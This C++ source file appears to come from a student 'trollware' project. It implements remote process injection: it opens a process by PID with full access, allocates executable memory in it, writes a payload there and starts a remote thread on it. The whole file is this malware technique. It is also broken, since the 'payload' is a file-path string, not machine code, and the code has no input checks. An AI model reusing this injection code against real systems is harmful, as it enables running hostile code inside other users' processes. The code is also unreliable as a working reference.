#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fstream>
#include <vector>
#include <tlhelp32.h>
#include <iostream>





HANDLE GetProcessHandleByName(std::string exe_name)
{
    HANDLE hProcess = {0};
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (stricmp(entry.szExeFile, exe_name.c_str()) == 0)
            {  
                hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
                CloseHandle(snapshot);
                return hProcess;

            }
        }
    }

    return NULL;
}


std::vector<unsigned char> ReadBinaryFile(const std::string& filepath) {
    std::ifstream file(filepath, std::ios::binary);
    if (!file) {
        throw std::runtime_error("Failed to open file: " + filepath);
    }

    // Get file size
    file.seekg(0, std::ios::end);
    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);

    // Allocate and read
    std::vector<unsigned char> buffer(size);
    if (!file.read(reinterpret_cast<char*>(buffer.data()), size)) {
        throw std::runtime_error("Failed to read the file.");
    }

    return buffer;
}





// std::vector<unsigned char>  ExecutableBytes = ReadBinaryFile("D:\\CLASSSWORKKK\\far5a\\Far5a-Trollware\\bin\\sound.exe");

unsigned char  my_payload []= "D:\\CLASSSWORKKK\\far5a\\Far5a-Trollware\\bin\\sound.exe";

// unsigned char * my_payload = ExecutableBytes.data();

unsigned int my_payload_len = sizeof(my_payload);





int main(int argc, char* argv[]) {
  HANDLE ph; // process handle
  HANDLE rt; // remote thread
  PVOID rb; // remote buffer

  // parse process ID
  printf("PID: %i", atoi(argv[1]));

  std::cout<<"Size of payload: "<<my_payload_len<<std::endl;
  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));


  //HANDLE otherProcessHandle = GetProcessHandleByName("calc.exe");


  // allocate memory buffer for remote process
  rb = VirtualAllocEx(ph, NULL, my_payload_len, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
  if(!rb)
  {
    std::cout<<"Something went wrong during allocation of memory in the remote process"<<std::endl;
  }

  SIZE_T bits_written = 0;
  // "copy" data between processes
  WriteProcessMemory(ph, rb, my_payload, my_payload_len, &bits_written);
  std::cout<<"bits written: "<<bits_written;



  // our process start new thread
  rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)rb, NULL, 0, NULL);
  CloseHandle(ph);
  return 0;
}